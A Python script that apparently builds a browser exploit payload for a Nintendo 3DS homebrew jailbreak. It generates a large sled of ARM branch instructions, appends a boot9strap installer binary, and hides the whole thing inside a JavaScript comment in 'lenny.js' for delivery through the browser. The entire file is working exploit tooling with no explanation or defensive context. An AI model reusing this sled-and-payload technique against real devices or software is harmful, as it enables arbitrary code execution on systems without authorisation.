import os,sys,struct
size=0xfbe00
data=[]
jump=0xea000000+(size//4)
movR6PC=0xe1a0600f
for i in range(0, size, 4):
	data.append(struct.pack("<I", jump))
	jump-=1
data=b''.join(data)
data+=struct.pack("<I", movR6PC)*8
with open("mini_b9s_installer/mini_b9s_installer.bin","rb") as f:
	b9s=f.read()+(b"\x00"*0x1000)
data+=b9s
temp=b"var i=0/*aaa" + data + b"*/var x=2"

with open("lenny.js","wb") as f:
	f.write(temp)